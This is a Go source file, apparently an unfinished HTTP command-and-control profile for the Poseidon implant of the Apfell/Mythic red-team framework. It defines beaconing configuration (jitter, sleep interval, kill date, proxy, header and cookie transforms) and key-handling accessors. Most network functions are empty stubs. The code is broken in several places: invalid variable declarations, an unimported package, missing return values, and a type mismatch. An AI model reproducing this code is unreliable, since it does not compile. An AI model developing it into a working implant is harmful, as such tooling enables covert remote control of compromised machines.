// +build http

package profiles

import (
	"encoding/json"
	"bytes"
	"crypto/rsa"
	"encoding/base64"
	"fmt"
	"io/ioutil"
	"log"
	"math"
	"net/http"
	"os"
	"reflect"
	"strings"
	"time"

	"github.com/xorrior/poseidon/pkg/utils/crypto"
	"github.com/xorrior/poseidon/pkg/utils/functions"
	"github.com/xorrior/poseidon/pkg/utils/structs"
)

var apfellHTTPC2Config := []byte(`
AGENT_HTTP_CONFIG
`)

var seededRand *rand.Rand = rand.New(rand.NewSource(time.Now().UnixNano()))

var c2config C2HttpConfig{}

type C2Http struct {
	Interval int 
	ExchangingKeys bool
	ApfellID string
	UUID string 
	AesPSK string 
	RsaPrivateKey *rsa.PrivateKey
}

type C2HttpConfig struct {
	Get GetConfig `json:"GET"`
	Post PostConfig `json:"POST"`
	Jitter int `json:"jitter"`
	Interval int `json:"interval"`
	ChunkSize int `json:"chunk_size"`
	KeyExchange bool `json:"key_exchange"`
	Proxy ProxyConfig `json:"proxy"`
	KillDate string `json:"kill_date"`
}


// Struct definitions for HTTP C2 profile
type ProxyConfig struct {
	Port int `json:"port"`
	Url string `json:"url"`
}

type GetConfig struct {
	ServerBody    []Transforms        `json:"ServerBody"`
	ServerHeaders []json.RawMessage   `json:"ServerHeaders"`
	ServerCookies Cookies             `json:"ServerCookies"`
	AgentMessage  []MessageDefinition `json:"AgentMessage"`
}

type PostConfig struct {
	ServerBody    []Transforms        `json:"ServerBody"`
	ServerCookies []Cookie            `json:"ServerCookies"`
	ServerHeaders []json.RawMessage   `json:"ServerHeaders"`
	AgentMessage  []MessageDefinition `json:"AgentMessage"`
}

type MessageDefinition struct {
	Urls            []string          `json:"urls"`
	Uri             string            `json:"uri"`
	UrlFunctions    []UrlFunctions    `json:"urlFunctions"`
	AgentHeaders    []json.RawMessage `json:"AgentHeaders"`
	QueryParameters QueryParameters   `json:"QueryParameters"`
	Cookies         Cookies           `json:"cookies"`
	Body            []Transforms      `json:"Body"`
}

type UrlFunctions struct {
	Name       string       `json:"name"`
	Value      string       `json:"value"`
	Transforms []Transforms `json:"transforms"`
}

type QueryParameters struct {
	QueryParameters []QueryParameter `json:"QueryParameters"`
}

type QueryParameter struct {
	Name       string       `json:"name"`
	Value      string       `json:"value"`
	Transforms []Transforms `json:"transforms"`
}

type Cookies struct {
	Cookies []Cookie `json:"cookies"`
}

type Cookie struct {
	Name       string       `json:"name"`
	Value      string       `json:"value"`
	Transforms []Transforms `json:"transforms"`
}

type Transforms struct {
	Function   string   `json:"function"`
	Parameters []string `json:"parameters"`
}


func newProfile() Profile {
	err := json.Unmarshal(apfellHTTPC2Config, &c2config)
	if err != nil {
		log.Println("Error unmarshaling HTTP c2 config json: ", err.Error())
		return nil
	}

	return &C2Http{}
}

func (c *C2Http) SetConfig() (bool, error) {
	c.Interval = c2config.Interval
	c.ExchangingKeys = c2config.KeyExchange
}

func (c C2Http) Header() string {
	return ""
}

func (c *C2Http) SetHeader(newHeader string) {
	c.HostHeader = newHeader
}

func (c C2Http) URL() string {
	return ""
}

func (c *C2Http) getRandomBaseURL() string {
	return ""
}

func (c *C2Http) SetURL(newURL string) {
	
}

func (c *C2Http) SetURLs(newURLs []string) {
	
}

func (c C2Http) SleepInterval() int {
	return c.Interval
}

func (c *C2Http) SetSleepInterval(interval int) {
	c.Interval = interval
}

func (c C2Http) C2Commands() []string {
	return ""
}

func (c *C2Http) SetC2Commands(commands []string) {
	
}

func (c C2Http) XKeys() bool {
	return c.ExchangingKeys
}

func (c *C2Http) SetXKeys(xkeys bool) {
	c.ExchangingKeys = xkeys
}

func (c C2Http) ApfID() string {
	return c.ApfellID
}

func (c *C2Http) SetApfellID(newApf string) {
	c.ApfellID = newApf
}

func (c C2Http) UniqueID() string {
	return c.UUID
}

func (c *C2Http) SetUniqueID(newID string) {
	c.UUID = newID
}

func (c *C2Http) SetUserAgent(ua string) {
	
}

func (c C2Http) GetUserAgent() string {
	return ""
}

func (c C2Http) AesPreSharedKey() string {
	return c.AesPSK
}

func (c *C2Http) SetAesPreSharedKey(newKey string) {
	c.AesPSK = newKey
}

func (c C2Http) RsaKey() *rsa.PrivateKey {
	return c.RsaPrivateKey
}

func (c *C2Http) SetRsaKey(newKey *rsa.PrivateKey) {
	c.RsaPrivateKey = newKey
}

func (c C2Http) ProfileType() string {
	t := reflect.TypeOf(c)
	return t.Name()
}

func (c *C2Http) CheckIn(ip string, pid int, user string, host string) interface{} {
	c.ApfellID = c.UUID
	
}

func (c *C2Http) htmlGetData()  {
	client := &http.Client{}
}

func (c *C2Http) encodeBase64(value string) string {
	return base64.StdEncoding.EncodeToString([]byte(value))
}

func (c *C2Http) decodeBase64(value string) ([]byte, error) {
	result, err := base64.StdEncoding.DecodeString(value)
	if err != nil {
		return nil, err
	}

	return result, err
}

func (c *C2Http) prepend(value string, param string) {
	return param + value
}

func (c *C2Http) rprepend()  {
	
}